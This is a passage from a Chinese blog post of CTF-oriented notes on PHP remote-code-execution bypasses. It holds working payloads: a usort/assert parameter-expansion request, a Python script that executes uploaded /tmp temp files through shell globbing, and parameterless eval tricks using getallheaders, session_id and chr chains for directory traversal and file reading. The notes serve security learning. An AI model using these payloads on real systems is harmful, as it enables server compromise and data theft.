<h4 id="利用变长参数特性展开数组"><a href="#利用变长参数特性展开数组" class="headerlink" title="利用变长参数特性展开数组"></a>利用变长参数特性展开数组</h4>在PHP中可以使用 <code>func(...$arr)</code>这样的方式，将$arr数组展开成多个参数，传入func函数。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /test.php?1[]=test&amp;1[]=var_dump($_SERVER);&amp;2=assert HTTP/1.1</span><br><span class="line">Host: localhost:8081</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 22</span><br><span class="line"></span><br><span class="line">param=usort(...$_GET);</span><br></pre></td></tr></table></figure>
<h3 id="linux下的临时文件利用"><a href="#linux下的临时文件利用" class="headerlink" title="linux下的临时文件利用"></a>linux下的临时文件利用</h3></li>
</ul>
<p>在文件上传时，默认会将文件暂存在系统的临时文件目录，（Linux 默认的临时目录为 /tmp），文件名<code>/tmp/phpXXXXXX</code>最后6个字符是随机的大小写字母<br>linux支持正则匹配，在ascii码表，可见大写字母位于<code>@，[</code>之间，而shell下可以利用<code>.</code>来执行任意脚本<br>所以我们可以假设上传的临时文件的文件名最后一个字母为大写字母，从而锁定文件并执行，文件内容就是我们上传的文件</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s = requests.session()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    url = <span class="string">&quot;http://127.0.0.1:61560/?shell=&quot;</span></span><br><span class="line">    c = <span class="string">&quot;?&gt;&lt;?=`. /???/????????[@-[]`;&quot;</span></span><br><span class="line">    payload = url+c</span><br><span class="line">    reques = s.post(url=payload, files=&#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&#x27;1.php&#x27;</span>,<span class="string">b&#x27;env&#x27;</span>)&#125;)</span><br><span class="line">    <span class="keyword">if</span> reques.text.find(<span class="string">&quot;moectf&#123;&quot;</span>) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(reques.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>




<h3 id="无参数rce"><a href="#无参数rce" class="headerlink" title="无参数rce"></a>无参数rce</h3><h4 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(&#x27;;&#x27; === preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;code&#x27;])) &#123;    </span><br><span class="line">    eval($_GET[&#x27;code&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>(?R)是引用当前表达式的意思，即可以用\w+((?R)?)替换到(?R)的位置，因此可以衍生成匹配\w+(\w+((?R)?))、\w+(\w+(\w+((?R)?)))、…<br>可以是a()、a(b())或a(b(c()))，但不能是a(‘b’)或a(‘b’,’c’)，不能带参数</p>
<h4 id="从外取值"><a href="#从外取值" class="headerlink" title="从外取值"></a>从外取值</h4><h5 id="1-getallheaders"><a href="#1-getallheaders" class="headerlink" title="1.getallheaders()"></a>1.getallheaders()</h5><p>这个函数的作用是获取http所有的头部信息，即headers，但这个有个限制条件就是必须在apache的环境下可以使用<br>返回值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">array(8) &#123; </span><br><span class="line">    [&quot;Host&quot;]=&gt; string(14) &quot;106.14.114.127&quot; </span><br><span class="line">    [&quot;Connection&quot;]=&gt; string(10) &quot;keep-alive&quot; </span><br><span class="line">    [&quot;Cache-Control&quot;]=&gt; string(9) &quot;max-age=0&quot; </span><br><span class="line">    [&quot;Upgrade-Insecure-Requests&quot;]=&gt; string(1) &quot;1&quot; </span><br><span class="line">    [&quot;User-Agent&quot;]=&gt; string(120) &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36&quot; </span><br><span class="line">    [&quot;Accept&quot;]=&gt; string(118) &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&quot;</span><br><span class="line">     [&quot;Accept-Encoding&quot;]=&gt; string(13) &quot;gzip, deflate&quot; [&quot;Accept-Language&quot;]=&gt; string(14) &quot;zh-CN,zh;q=0.9&quot; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/QQ%E6%88%AA%E5%9B%BE20220802184221.png" alt="QQ截图20220802184221"><br>如果当前为多元数组，则返回的元素为数组，另外current的还有个别名为<strong>pos</strong><br>有的时候当我们想读的文件比较靠后时，就可以用array_reverse()这个函数把它倒过来，就可以少用几个next()</p>
<p>我们在http header中写入我们的参数，可用其进行bypass 无参数函数执行<br>例如<br><code>end(getallheaders())</code></p>
<h5 id="2-get-defined-vars-版本要求：PHP-4-gt-4-0-4-PHP-5-PHP-7"><a href="#2-get-defined-vars-版本要求：PHP-4-gt-4-0-4-PHP-5-PHP-7" class="headerlink" title="2.get_defined_vars()(版本要求：PHP 4 &gt;= 4.0.4, PHP 5, PHP 7)"></a>2.get_defined_vars()(版本要求：PHP 4 &gt;= 4.0.4, PHP 5, PHP 7)</h5><p>返回一个包含所有已定义变量列表的<strong>多维</strong>数组，这些变量包括环境变量、服务器变量和用户定义的变量。<br>在这里可以发现其只能回显全局变量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$_GET</span><br><span class="line">$_POST</span><br><span class="line">$_FILES</span><br><span class="line">$_COOKIE</span><br></pre></td></tr></table></figure>
<h5 id="3-session-id"><a href="#3-session-id" class="headerlink" title="3.session_id()"></a>3.session_id()</h5><p>注意的就是session_id()要开启session才能用，session_id()会获取/设置COOKIE的PHPSESSID，<br>但PHPSESSID允许字母和数字出现，我们可以先将其16进制编码，再用hex2bin函数将16进制转换为字符串</p>
<h5 id="4-getenv"><a href="#4-getenv" class="headerlink" title="4.getenv()"></a>4.getenv()</h5><p>getenv() ：获取环境变量的值(在PHP7.1之后可以不给予参数)<br>所以该函数只适用于PHP7.1之后版本<br><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/1594112652.jpg" alt="1594112652"><br>我们怎么从一个偌大的数组中取出我们指定的值,我们可用爆破的方式获取数组中任意位置需要的值<br>array_rand随机返回一个或多个键，第二个参数用来确定要选出几个键，默认是一个键<br>array_flip交换数组中的键和值</p>
<h4 id="直接读取文件"><a href="#直接读取文件" class="headerlink" title="直接读取文件"></a>直接读取文件</h4><h5 id="路径操作"><a href="#路径操作" class="headerlink" title="路径操作"></a>路径操作</h5><ol>
<li>获取当前目录</li>
</ol>
<ul>
<li><p>getcwd()获取当前目录</p>
</li>
<li><p>scandir()列出目录中的文件和目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?code=var_dump(scandir(getcwd()));</span><br><span class="line"></span><br><span class="line">array(3) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(9) &quot;index.php&quot; &#125;</span><br></pre></td></tr></table></figure>
<p>正常的，也可以使用print_r(scandir(‘.’));来查看当前目录所有文件名</p>
</li>
<li><p>localeconv() 函数返回一个包含本地数字及货币格式信息的数组，它返回的是一个二维数组，而它的第一位就是一个点.<br><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/1594112630.jpg" alt="1594112630"></p>
</li>
<li><p>chr(46)<br>chr(46)就是字符.,chr() 函数以256为一个周期，所以 chr(46)、chr(302)、chr(558)等都等于 .</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1. phpversion()</span><br><span class="line">如果PHP版本为5</span><br><span class="line">floor(phpversion())返回 5</span><br><span class="line">sqrt(floor(phpversion()))返回2.2360679774998</span><br><span class="line">tan(floor(sqrt(floor(phpversion()))))返回-2.1850398632615</span><br><span class="line">cosh(tan(floor(sqrt(floor(phpversion())))))返回4.5017381103491</span><br><span class="line">sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))返回45.081318677156</span><br><span class="line">ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))返回46</span><br><span class="line">chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))返回&quot;.&quot;</span><br><span class="line">2. time()</span><br><span class="line">返回自从 Unix 纪元（格林威治时间 1970 年 1 月 1 日 00:00:00）到当前时间的秒数,date(&quot;Y-m-d&quot;,$t)可以返回当地时间。</span><br><span class="line">chr(time())，一个周期(256)必定出现一次&quot;.&quot;</span><br><span class="line">chr(localtime(time())) 以数组的形式返回本地时间，第一个值为秒，则一个周期(60)必定出现一次&quot;.&quot;</span><br><span class="line">3. crypt</span><br><span class="line">hebrevc(crypt(arg))可以随机生成一个hash值，第一个字符随机是$(大概率) 或者 &quot;.&quot;(小概率) 然后通过chr(ord())只取第一个字符</span><br><span class="line">chr(ord(hebrevc(crypt(time()))))</span><br></pre></td></tr></table></figure></li>
<li><p>其他获得.的方法<br>strrev(crypt(serialize(array())))也可以得到”.”</p>
</li>
</ul>
<ol start="2">
<li>目录遍历<br>那么既然不在这一层目录，如何进行目录上跳呢？</li>
</ol>
<ul>
<li>dirname()返回路径中的目录部分</li>
<li>chdir()可以更改我们的当前目录<br>通过不断切换目录实现任意文件读取<br>当然chdir(‘..’),即chdir(next(scandir(getcwd()))),也可以更改我们的当前目录</li>
</ul>

        </div>

        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/rce/"># rce</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2022/09/27/php/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">php反序列化</a>
            
            
            <a class="next" rel="next" href="/2022/08/03/php/php%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">php 命令执行</a>
            
        </section>


    </article>
</div>

            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
        <span>© mayylu | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>

</html>